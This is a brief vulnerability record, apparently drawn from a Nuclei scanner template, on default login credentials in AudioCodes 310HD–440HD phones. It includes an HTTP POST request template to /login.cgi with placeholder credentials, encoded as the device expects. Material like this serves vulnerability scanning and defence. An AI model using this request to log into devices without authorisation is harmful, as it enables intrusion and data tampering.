# Vulnerability: AudioCodes 310HD, 320HD, 420HD, 430HD & 440HD - Default Login
**Classification:** CWE-798
**Source:** Nuclei Template (`audiocodes-default-login.yaml`)

## Description
AudioCodes devices 310HD, 320HD, 420HD, 430HD & 440HD contain a default login vulnerability. Default login credentials were discovered. An attacker can obtain access to user accounts and access sensitive information, modify data, and/or execute unauthorized operations.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /login.cgi HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

user={{username}}&psw={{url_encode(base64("{{password}}"))}}
```

